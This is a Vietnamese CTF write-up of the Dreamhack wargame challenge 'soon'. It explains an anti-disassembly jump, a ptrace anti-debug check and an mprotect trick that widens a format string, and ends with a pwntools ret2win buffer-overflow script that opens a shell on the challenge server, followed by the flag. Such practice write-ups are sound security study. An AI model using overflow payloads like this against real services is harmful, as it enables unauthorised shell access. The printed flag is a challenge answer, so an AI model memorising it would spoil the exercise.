---
title: Dreamhack Wargame
date: 2025-2-14 02:30:00 +0700
categories: [rev, pwn]
tag: [Reverse Engineering, Dreamhack Wargame, Pwnable, Ret2Win]
---

## soon
* Ở thử thách này, chúng ta sẽ sử dụng kĩ thuật `ret2win` - một kĩ thuật khai thác các lỗ hổng `Buffer Overflow` nhằm ghi đè giá trị trả về của hàm bằng một hàm khác 
* Tuy nhiên, theo tôi cảm thấy thử thách này đòi hỏi nhiều kĩ năng dịch ngược hơn. Và tại sao tôi lại nghĩ như vậy thì hãy bắt đầu vào phân tích

### Phân tích
Tại hàm main của chương trình cho phép nhận vào 15 kí tự            
![image](/assets/Dreamhack%20Wargame/soon/image.png)            

Và ta thấy một hàm để tạo shell         
![image](/assets/Dreamhack%20Wargame/soon/image-1.png)          

Vì input chỉ nhận 15 kí tự nên chắc nhiều bạn (và cả tôi) sẽ nghĩ không thể khai thác bằng `ret2win`          

Xem qua `_init_array` ta thấy `sub_4011B0` và `loc_4011B6` đều được thực thi            
![image](/assets/Dreamhack%20Wargame/soon/image-2.png)          

Xem qua `loc_4011B6`        
Khi tôi decompile thì tôi nhận được thông báo       
![image](/assets/Dreamhack%20Wargame/soon/image-3.png)      

![image](/assets/Dreamhack%20Wargame/soon/image-4.png)          
câu lệnh `jmp` này chính là nguyên nhân         
Đây là một kĩ thuật anti-disassembly, nó khiến cho chương trình hiểu sai và hiển thị chỉ dẫn không chính xác        

Thử kiểm tra trong gdb          
![image](/assets/Dreamhack%20Wargame/soon/image-5.png)              

Chỉ cần sửa `jmp` lại giống như hình bên dưới là được           
![image](/assets/Dreamhack%20Wargame/soon/image-6.png)  

Sau đó ấn p để IDA có thể nhận biết là một hàm          
![image](/assets/Dreamhack%20Wargame/soon/image-7.png)      

Vậy là đã decompile thành công              
![image](/assets/Dreamhack%20Wargame/soon/image-8.png)              

Đầu tiên, chương trình thực hiện tải thư viện động `libc.so.6`                  
![image](/assets/Dreamhack%20Wargame/soon/image-9.png)                      

Tiếp đến thực hiện giải mã chuỗi có nội dung là `ptrace` và `mprotect`                  
![image](/assets/Dreamhack%20Wargame/soon/image-10.png)                     

Sau đó thực hiện gọi `dlsym` tìm`ptrace` và thực thi                    
![image](/assets/Dreamhack%20Wargame/soon/image-11.png)                                        

Nếu thành công thì nó sẽ gọi `dlsym` tìm `mprotect` và thực thi để thêm quyền ghi và đọc vào vùng lưu trữ chuỗi kí tự `%15s` (4096 byte) và thay đổi chuỗi thành `%s`               
![image](/assets/Dreamhack%20Wargame/soon/image-12.png)                                                             

Tuy nhiên thông qua `ptrace` cũng có thể phát hiện debug nên sẽ không thể gọi tới `mprotect` nếu như đang debug                 

Lúc này chương trình của chúng ta sẽ là `%s` thay vì `%15s` như ban đầu                 
![image](/assets/Dreamhack%20Wargame/soon/image.png)                 

### Khai thác                                       
Như đã nói chúng ta sẽ sử dụng kĩ thuật `ret2win`                           
Thực hiện ghi đè lên vùng nhớ đề chương trình có thể chuyển đến shellcode                       
![alt text](/assets/Dreamhack%20Wargame/soon/image-13.png)                  

**Script**                  
```python
from pwn import *

HOST = "host1.dreamhack.games"
PORT = 9248

# p = process("./main")
p=remote(HOST, PORT)

payload = b'a'*256 + b'b'*8 + p64(0x401303)

p.sendline(payload)
p.interactive()
```
`Flag: DH{function_in_0x4011B6_was_the_key_of_this_trick_15124b5daffd04}`